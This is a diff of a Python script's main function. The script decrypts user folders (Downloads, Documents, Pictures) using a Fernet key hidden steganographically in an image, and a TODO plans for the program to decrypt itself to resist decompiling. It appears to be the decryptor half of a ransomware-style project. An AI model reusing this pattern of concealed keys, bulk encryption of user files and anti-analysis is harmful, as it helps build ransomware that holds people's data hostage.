@@ -41,22 +41,26 @@ def process_directory(directory: str, f_key: Fernet):
 
 
 def main():
+    # TODO: Update as needed
+    # Should decrypt itself last in order to prevent decompiling in the future
     directories_to_decrypt = [
-        os.path.expanduser("~/Downloads"),
-        os.path.expanduser("~/Documents"),
-        os.path.expanduser("~/Pictures")
+        #os.path.expanduser("~/Downloads"),
+        #os.path.expanduser("~/Documents"),
+        #os.path.expanduser("~/Pictures"),
+        #os.getcwd()
     ]
 
     # Extracts the key from a specified image
+    # TODO: Update image name/path as need
     key: str = extract_message("download.jpg", "Mochi")
     # Converts that key to a Fernet object to gain access to Fernet methods
     fernet_key: Fernet = Fernet(key)
 
-    # Executes multiple threads to speed up process of decryption
-    with ThreadPoolExecutor() as executor:  # Initialize ThreadPoolExecutor for multithreading
-        # Submit each directory to be processed in a separate thread
+    # Initializes ThreadPoolExecutor to execute multiple threads to speed up process of decryption
+    with ThreadPoolExecutor() as executor:
+        # Submits each directory to be processed in a separate thread
         futures = [executor.submit(process_directory, directory, fernet_key) for directory in directories_to_decrypt]
-        # Ensure each thread completes by calling `.result()` on each future
+        # Ensures each thread completes by calling `.result()` on each future
         for future in futures:
             future.result()
 
